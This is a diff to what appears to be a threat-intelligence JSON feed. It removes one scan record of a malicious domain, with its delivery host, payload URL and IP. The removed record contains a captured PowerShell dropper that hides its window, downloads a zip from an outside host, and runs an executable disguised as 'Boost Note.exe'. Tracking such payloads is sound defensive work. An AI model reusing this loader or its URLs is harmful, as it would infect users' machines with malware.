@@ -1516,24 +1516,5 @@
     ],
     "ReportId": "cmwqi7z1226q00omljdxusk2n",
     "ScannedAt": "2026-11-21T14:29:30.352000+00:00"
-  },
-  {
-    "UrlDomain": "yigilca-haber.xyz",
-    "DeliveryUrl": [
-      "friendsoftorreabbey.com"
-    ],
-    "PayloadUrl": [
-      "https://friendsoftorreabbey.com/32b"
-    ],
-    "IP": [
-      "172.67.194.161"
-    ],
-    "Related": [],
-    "Payload": "$url = \"https://friendsoftorreabbey[.]com/32b\";\n$filename = \"Boost Note.exe\";\n$path = $env:TEMP;\n$archive = Join-Path $path \"TlkVMerN.zip\";\n$filepath = Join-Path $path $filename;\n$signature = @\"\nusing System;\nusing System.Runtime.InteropServices;\npublic class Win32 {\n\t[DllImport(\"kernel32.dll\")]\n\tpublic static extern IntPtr GetConsoleWindow();\n\t[DllImport(\"user32.dll\")]\n\tpublic static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);\n}\n\"@;\nAdd-Type $signature;\n$hwnd = [Win32]::GetConsoleWindow();\nif($hwnd -ne [IntPtr]::Zero)\n{\n\t[Win32]::ShowWindow($hwnd, 0);\n}\nNew-Item -Path $path -ItemType Directory -Force;\ncurl $url -o $archive;\nExpand-Archive -Path $archive -DestinationPath $path -Force;\nRemove-Item $archive -Force;\nStart-Process $filepath;\nexit",
-    "ResolvedDownloadUrl": [
-      "https://friendsoftorreabbey.com/32b"
-    ],
-    "ReportId": "cmwqh59zd26op0omlzr69fgi7",
-    "ScannedAt": "2026-11-21T13:59:24.938000+00:00"
   }
 ]
